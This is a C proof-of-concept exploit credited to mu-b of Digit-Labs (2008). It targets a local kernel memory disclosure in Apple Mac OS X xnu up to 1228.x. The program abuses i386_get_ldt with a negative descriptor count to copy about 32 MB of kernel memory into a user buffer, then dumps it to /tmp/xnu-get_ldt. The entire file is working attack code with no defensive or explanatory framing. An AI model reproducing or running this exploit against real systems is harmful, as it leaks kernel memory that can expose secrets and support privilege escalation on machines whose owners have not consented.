#include <stdio.h>
#include <stdlib.h>

#include <architecture/i386/table.h>
#include <i386/user_ldt.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

#define TMP_FILE  "/tmp/xnu-get_ldt"
#define READ_SIZE 0x2000000

int
main (int argc, char **argv)
{
  int fd, n, num_desc;
  void *ptr;

  printf ("Apple MACOS X xnu <= 1228.x local kernel memory disclosure\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  n = i386_get_ldt (0, ((int)NULL) + 1, 0);
  if (n < 0)
    {
      fprintf (stderr, "failed i386_get_ldt(): %d\n", n);
      return (EXIT_FAILURE);
    }

  num_desc = n;
  printf ("i386_get_ldt: num_desc: %d\n", num_desc);

  fd = open (TMP_FILE, O_CREAT | O_RDWR, S_IRUSR | S_IWUSR);
  if (fd < 0)
    {
      fprintf (stderr, "failed open(): %d\n", fd);
      return (EXIT_FAILURE);
    }

  ptr = mmap (NULL, READ_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
  if ((int) ptr == -1)
    {
      fprintf (stderr, "failed mmap()\n");
      return (EXIT_FAILURE);
    }

  memset (ptr, 0x00, READ_SIZE);
  i386_get_ldt (num_desc - 1, (union ldt_entry *) ptr, -(num_desc - 1));

  n = write (fd, ptr, READ_SIZE);
  munmap (ptr, READ_SIZE);
  close (fd);

  printf ("%d-bytes of kernel memory dumped to: %s\n", n, TMP_FILE);

  return (EXIT_SUCCESS);
}
